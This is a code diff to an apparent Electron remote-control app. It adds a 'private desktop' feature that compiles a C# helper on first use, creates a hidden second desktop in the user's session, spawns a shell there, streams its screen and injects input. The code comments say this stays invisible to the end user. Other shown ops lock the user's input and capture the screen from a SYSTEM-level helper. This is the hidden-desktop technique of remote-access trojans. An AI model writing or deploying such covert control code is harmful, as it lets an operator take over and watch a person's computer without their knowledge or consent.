@@ -813,6 +813,12 @@ ipcMain.on('op', (_e, msg) => {
       opReply({ type: 'opResult', reqId, ok: true, data: { has } });
     }
     else if (op === 'lockinput') { inject('B ' + (payload.on ? '1' : '0')); opReply({ type: 'opResult', reqId, ok: true, data: { locked: !!payload.on } }); }
+    else if (op === 'pdesk-start') {
+      const ok = startPrivateDesktop(payload.shell);
+      opReply({ type: 'opResult', reqId, ok, data: { on: ok } });
+    }
+    else if (op === 'pdesk-stop') { stopPrivateDesktop(); opReply({ type: 'opResult', reqId, ok: true }); }
+    else if (op === 'pdesk-input') { pdeskInput(payload.line || ''); opReply({ type: 'opResult', reqId, ok: true }); }
     else if (op === 'sdcap') {
       // Manually drive the SYSTEM-side BitBlt helper so the operator gets a
       // view even when Electron's desktopCapturer returns black frames (e.g.
@@ -1247,6 +1253,65 @@ function stopSecureCapture() {
 }
 ipcMain.on('sd:start', () => startSecureCapture());
 ipcMain.on('sd:stop', () => stopSecureCapture());
+
+// ---- Private-desktop capture + input ("pdesk") ----
+// Operator-only "backstage GUI": pdesk.exe creates a second desktop in the
+// user's session, spawns a shell there, BitBlts it at ~8fps, and injects input
+// into it. The end user never sees any of it — the desktop isn't switched in
+// via SwitchDesktop. Same build-on-first-use pattern as sdcap/injector; same
+// stdio contract on the capture side. Input commands go in on stdin.
+function compilePdesk() {
+  const dir = path.join(__dirname, 'pdesk');
+  const src = path.join(dir, 'PrivateDesktop.cs');
+  const out = path.join(dir, 'pdesk.exe');
+  const csc = ['C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe',
+    'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe'].find((p) => fs.existsSync(p));
+  if (!csc || !fs.existsSync(src)) return false;
+  try {
+    require('child_process').execFileSync(csc, ['/nologo', '/optimize+', '/target:winexe',
+      '/r:System.Drawing.dll', '/out:' + out, src], { stdio: 'ignore', windowsHide: true });
+    return fs.existsSync(out);
+  } catch { return false; }
+}
+let pdProc = null;
+function startPrivateDesktop(shell) {
+  if (pdProc) return true;
+  const exe = path.join(__dirname, 'pdesk', 'pdesk.exe');
+  if (!fs.existsSync(exe) && !compilePdesk()) return false;
+  const args = ['--name', 'hc-pdesk', '--fps', '8'];
+  if (shell) { args.push('--shell'); args.push(shell); }
+  try { pdProc = spawn(exe, args, { stdio: ['pipe', 'pipe', 'ignore'], windowsHide: true }); }
+  catch { pdProc = null; return false; }
+  let buf = Buffer.alloc(0);
+  pdProc.stdout.on('data', (chunk) => {
+    buf = buf.length ? Buffer.concat([buf, chunk]) : chunk;
+    while (buf.length >= 4) {
+      const len = buf.readUInt32BE(0);
+      if (len <= 0 || len > 16 * 1024 * 1024) { buf = Buffer.alloc(0); break; }
+      if (buf.length < 4 + len) break;
+      const frame = Buffer.from(buf.slice(4, 4 + len));
+      buf = buf.slice(4 + len);
+      try { if (win && !win.isDestroyed()) win.webContents.send('pd:frame', frame); } catch {}
+    }
+  });
+  pdProc.on('exit', () => { pdProc = null; });
+  pdProc.on('error', () => { pdProc = null; });
+  return true;
+}
+function stopPrivateDesktop() {
+  if (!pdProc) return;
+  const p = pdProc; pdProc = null;
+  try { p.stdin.write('Q\n'); p.stdin.end(); } catch {}
+  const t = setTimeout(() => { try { p.kill(); } catch {} }, 1500);
+  p.on('exit', () => clearTimeout(t));
+}
+function pdeskInput(line) {
+  if (!pdProc) return false;
+  try { pdProc.stdin.write(line + '\n'); return true; } catch { return false; }
+}
+ipcMain.on('pd:start', (_e, s) => startPrivateDesktop(s && s.shell));
+ipcMain.on('pd:stop', () => stopPrivateDesktop());
+ipcMain.on('pd:input', (_e, line) => pdeskInput(line));
 
 function procKill(reqId, pid) {
   const exe = process.env.SystemRoot ? path.join(process.env.SystemRoot, 'System32', 'taskkill.exe') : 'taskkill';
